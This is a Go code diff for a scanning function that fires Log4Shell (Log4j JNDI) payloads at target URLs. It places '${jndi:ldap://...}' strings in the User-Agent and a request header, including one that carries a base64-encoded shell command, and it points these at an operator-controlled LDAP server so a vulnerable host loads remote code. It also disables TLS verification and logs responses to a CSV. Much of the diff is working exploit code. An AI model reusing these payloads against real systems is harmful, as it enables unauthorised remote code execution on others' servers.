@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"net"
 	"net/http"
+	"net/url"
 	"strings"
 	"sync"
 	"time"
@@ -13,23 +14,31 @@ import (
 	log "github.com/sirupsen/logrus"
 )
 
-func ScanIP(targetUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan string) {
+func ScanIP(hostUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan string) {
 	defer wg.Done()
 
 	client := &http.Client{
-		Timeout: 3 * time.Second,
+		Timeout: 5 * time.Second,
 		Transport: &http.Transport{
-			TLSHandshakeTimeout:   1 * time.Second,
-			ResponseHeaderTimeout: 1 * time.Second,
-			ExpectContinueTimeout: 1 * time.Second,
+			TLSHandshakeTimeout:   5 * time.Second,
+			ResponseHeaderTimeout: 5 * time.Second,
+			ExpectContinueTimeout: 5 * time.Second,
 			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
 		},
 	}
 
-	// TODO: add endpoint exploit
+	log.Debugf("Target URL: %s", hostUrl)
+	baseUrl, err := url.Parse(hostUrl)
+	if err != nil {
+		pterm.Error.Printf("Bad URL: %s", hostUrl)
+		log.Fatal(err)
+	}
+	//baseUrl.Path += "/${jndi:ldap://%s/exploit.class}"
+	targetUrl := baseUrl.String()
+	//targetUrl := fmt.Sprintf("%s/${jndi:ldap://%s/exploit.class}", hostUrl, serverUrl)
+	//targetUrl := hostUrl
 	targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/exploit.class}", serverUrl)
 	targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}", serverUrl)
-	log.Debugf("Target URL: %s", targetUrl)
 	//log.Debugf("Target User-Agent: %s", targetUserAgent)
 	//log.Debugf("Target X-Api-Version: %s", targetHeader)
 	request, err := http.NewRequest("GET", targetUrl, nil)
@@ -44,11 +53,12 @@ func ScanIP(targetUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan
 		log.Debug(err)
 	}
 	if response != nil {
-		url := strings.Split(targetUrl, ":")
+		url := strings.Split(hostUrl, ":")
 		if len(url) != 3 {
-			log.Fatal("Error in response url parsing:", targetUrl)
+			log.Fatal("Error in response hostUrl parsing:", url)
 		}
 		msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], response.StatusCode)
+		updateCsvRecords(msg)
 		resChan <- msg
 		log.Infof(msg)
 	}
